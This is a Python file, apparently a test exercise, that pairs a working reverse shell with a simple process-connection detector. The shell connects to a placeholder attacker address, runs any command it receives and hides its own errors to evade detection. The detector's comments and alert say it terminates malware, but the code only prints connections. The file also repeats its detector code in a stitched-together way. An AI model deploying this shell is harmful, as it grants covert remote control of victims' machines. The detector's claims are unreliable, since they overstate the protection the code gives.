import socket
import subprocess
import os
import psutil
import time
import ctypes

# ---- 1. Malware Simulation (Reverse Shell) ----
# This script mimics a reverse shell to test the detection tool

def reverse_shell():
    ATTACKER_IP = "192.168.1.100"  # Change this to your IP
    ATTACKER_PORT = 4444  # Change to your listening port

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        
        while True:
            command = s.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                break
            output = subprocess.getoutput(command)
            s.send(output.encode("utf-8"))
            
        s.close()
    except Exception as e:
        pass  # Ignore errors to avoid detection

# ---- 2. Detection Tool ----
# This script detects suspicious outbound connections and terminates them


def detect_reverse_shell():
    for proc in psutil.process_iter(attrs=['pid', 'name']):  # Remove 'connections'
        try:
            connections = proc.connections()  # Get connections separately
            for conn in connections:
                if conn.status == psutil.CONN_ESTABLISHED and conn.raddr:
                    print(f"Suspicious Process: {proc.info['name']} (PID: {proc.info['pid']}) -> {conn.raddr}")
        except (psutil.AccessDenied, psutil.NoSuchProcess):
            continue

detect_reverse_shell()
# ---- 3. Alert Function ----
def show_warning():
    ctypes.windll.user32.MessageBoxW(0, "Suspicious activity detected! Malware process terminated.", "Security Alert", 0x10)

if __name__ == "__main__":
    detect_reverse_shell()

import psutil

def detect_reverse_shell():
    for proc in psutil.process_iter(attrs=['pid', 'name']):  # Remove 'connections'
        try:
            connections = proc.connections()  # Get connections separately
            for conn in connections:
                if conn.status == psutil.CONN_ESTABLISHED and conn.raddr:
                    print(f"Suspicious Process: {proc.info['name']} (PID: {proc.info['pid']}) -> {conn.raddr}")
        except (psutil.AccessDenied, psutil.NoSuchProcess):
            continue
